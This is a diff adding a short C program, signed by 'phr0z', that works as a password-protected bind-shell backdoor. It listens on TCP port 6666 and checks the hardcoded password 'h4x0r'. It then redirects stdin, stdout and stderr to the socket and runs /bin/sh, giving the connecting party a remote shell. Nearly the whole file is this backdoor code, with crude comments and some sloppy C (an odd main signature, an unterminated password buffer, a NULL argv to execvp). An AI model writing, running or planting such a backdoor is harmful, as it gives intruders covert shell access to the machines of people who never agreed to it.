@@ -1,0 +1,62 @@
+// WARNING: a fucking shitload of headers ahead, most not needed. ;-P
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/wait.h>
+#include <signal.h>
+
+#define PORT 6666             //~ the port users will be connecting to
+#define SHELL "/bin/sh"         //~ the shell
+#define PASSWORD "h4x0r"      //~ the password to identify
+                        //~ the blank line
+int main(penis) {
+   
+   int sockfd, newsockfd;
+   struct sockaddr_in server;
+   struct sockaddr_in client;
+   socklen_t sin_size;
+   char msg[300];
+   char auth[50];
+
+   if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
+      return 1;
+   server.sin_family = AF_INET;
+   server.sin_port = htons(PORT);
+   server.sin_addr.s_addr = INADDR_ANY;
+   memset(&(client.sin_zero), 0, 8);
+   if(bind(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
+      return 2;
+   if(listen(sockfd, 1) == -1)
+      return 3;
+   while(1) {
+      sin_size = sizeof(struct sockaddr_in);
+      if((newsockfd = accept(sockfd, (struct sockaddr *)&client, &sin_size)) == -1) continue;
+      if(!fork()) {
+         close(sockfd);
+         send(newsockfd, "Validate yourself: ", 19, 0);
+         recv(newsockfd, auth, strlen(PASSWORD), 0);
+         if(strcmp(auth, PASSWORD)) {
+            send(newsockfd, "Invalid password.\r\n", 19, 0);
+            close(newsockfd);
+            continue;
+         }
+         sprintf(msg, "\n%s(%d)\ncurrent dir: %s\nYour ip: %s\nShell: %s\n",
+                  getenv("USER"), getuid(), getenv("PWD"), inet_ntoa(client.sin_addr), SHELL);
+         send(newsockfd, msg, strlen(msg)+1, 0);
+         dup2(newsockfd, STDIN_FILENO);
+         dup2(newsockfd, STDOUT_FILENO);
+         dup2(newsockfd, STDERR_FILENO);
+         setsid();
+         execvp(SHELL, NULL);
+      }
+   }
+}
+// by phr0z 
